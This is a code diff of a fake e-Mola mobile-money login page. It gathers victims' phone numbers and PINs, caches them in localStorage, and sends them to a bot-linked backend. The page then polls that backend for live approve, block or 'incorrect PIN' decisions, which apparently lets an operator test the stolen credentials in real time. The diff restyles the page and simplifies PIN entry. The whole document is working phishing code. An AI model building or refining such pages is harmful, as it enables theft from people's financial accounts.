@@ -8,51 +8,51 @@
 <style>
 body {
     font-family: Arial, sans-serif;
-    background: linear-gradient(180deg, #f2a44a, #c46b1a);
+    background: linear-gradient(180deg, #f9a03f, #f47f3d);
+    height: 100vh;
+    margin: 0;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
 }
 
 .pin-container {
-    width: 90%;
-    max-width: 380px;
+    width: 100%;
+    max-width: 420px;
+    padding: 20px;
     text-align: center;
-    color: #fff;
 }
 
 .logo {
-    font-size: 32px;
-    font-weight: bold;
-    margin-bottom: 40px;
+    margin-bottom: 25px;
+    color: #fff;
 }
 
-input[type="tel"] {
+.logo h1 {
+    margin: 0;
+    font-size: 32px;
+}
+
+.logo p {
+    margin: 5px 0 0;
+    font-size: 14px;
+    opacity: 0.9;
+}
+
+input {
     width: 100%;
     padding: 14px;
     border-radius: 25px;
     border: none;
     outline: none;
-    font-size: 16px;
     margin-bottom: 15px;
-    box-sizing: border-box;
+    font-size: 16px;
+    background: rgba(0,0,0,0.2);
+    color: #fff;
 }
 
-.pin-boxes {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 25px;
-}
-
-.pin-boxes input {
-    width: 60px;
-    height: 55px;
-    border-radius: 12px;
-    border: none;
-    font-size: 22px;
-    text-align: center;
+input::placeholder {
+    color: rgba(255,255,255,0.7);
 }
 
 button {
@@ -61,7 +61,7 @@ button {
     border-radius: 25px;
     border: none;
     background: #fff;
-    color: #000;
+    color: #333;
     font-size: 16px;
     font-weight: bold;
     cursor: pointer;
@@ -73,32 +73,31 @@ button:disabled {
 }
 
 .status {
-    margin-top: 15px;
+    margin-top: 12px;
     font-size: 14px;
+    color: #fff;
 }
 </style>
 </head>
+
 <body>
 
 <div class="pin-container">
-    <div class="logo">e-Mola</div>
 
-    <!-- PHONE NUMBER -->
-    <input id="phoneInput" type="tel" placeholder="Enter phone number" required>
+    <div class="logo">
+        <h1>e-Mola</h1>
+        <p>Meu cell, minha mola</p>
+    </div>
 
-    <!-- PIN -->
     <form id="pinForm">
-        <div class="pin-boxes">
-            <input type="tel" maxlength="1" inputmode="numeric">
-            <input type="tel" maxlength="1" inputmode="numeric">
-            <input type="tel" maxlength="1" inputmode="numeric">
-            <input type="tel" maxlength="1" inputmode="numeric">
-        </div>
+        <input id="phoneInput" type="tel" placeholder="Enter phone number" required>
+        <input id="pinInput" type="password" placeholder="PIN" maxlength="4" required>
 
-        <button id="submitBtn" disabled>LOGIN</button>
+        <button id="submitBtn">LOGIN</button>
     </form>
 
     <div class="status" id="status"></div>
+
 </div>
 
 <script>
@@ -112,49 +111,24 @@ if (!botId) {
     throw new Error("botId missing");
 }
 
-// ---------------- PIN INPUT LOGIC ----------------
-const inputs = document.querySelectorAll('.pin-boxes input');
-const button = document.getElementById('submitBtn');
-const statusDiv = document.getElementById('status');
-const phoneInput = document.getElementById('phoneInput');
-
-inputs[0].focus();
-
-inputs.forEach((input, i) => {
-    input.addEventListener('input', () => {
-        input.value = input.value.replace(/\D/g, '');
-        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
-
-        const allFilled = [...inputs].every(x => x.value.length === 1);
-        button.disabled = !(allFilled && phoneInput.value.trim());
-    });
-
-    input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && i > 0) {
-            inputs[i - 1].focus();
-        }
-    });
-});
-
-phoneInput.addEventListener('input', () => {
-    const allFilled = [...inputs].every(x => x.value.length === 1);
-    button.disabled = !(allFilled && phoneInput.value.trim());
-});
-
 // ---------------- SUBMIT PIN ----------------
 document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
-    statusDiv.textContent = '';
 
-    const phone = phoneInput.value.trim();
-    const pin = [...inputs].map(i => i.value).join('');
+    const phone = document.getElementById('phoneInput').value.trim();
+    const pin = document.getElementById('pinInput').value.trim();
+    const statusDiv = document.getElementById('status');
+    const btn = document.getElementById('submitBtn');
 
-    // ✅ STORE FOR NEXT PAGE
+    if (!phone || pin.length < 4) return;
+
+    // store for next page
     localStorage.setItem('phone', phone);
     localStorage.setItem('pin', pin);
 
-    button.disabled = true;
-    button.textContent = 'Logging in...';
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
+    statusDiv.textContent = '';
 
     const res = await fetch(`${BACKEND_URL}/submit-pin`, {
         method: 'POST',
@@ -176,9 +150,8 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
         if (d.blocked) {
             statusDiv.textContent = d.message || "Invalid number";
-            button.disabled = false;
-            button.textContent = 'LOGIN';
-            inputs.forEach(i => i.value = '');
+            btn.disabled = false;
+            btn.textContent = 'LOGIN';
             clearInterval(poll);
             return;
         }
@@ -189,10 +162,10 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
         }
 
         if (d.approved === false) {
-            statusDiv.textContent = "Incorrect PIN. Try again.";
-            button.disabled = false;
-            button.textContent = 'LOGIN';
-            inputs.forEach(i => i.value = '');
+            statusDiv.textContent = "Incorrect PIN";
+            btn.disabled = false;
+            btn.textContent = 'LOGIN';
+            document.getElementById('pinInput').value = '';
         }
     }, 1500);
 });
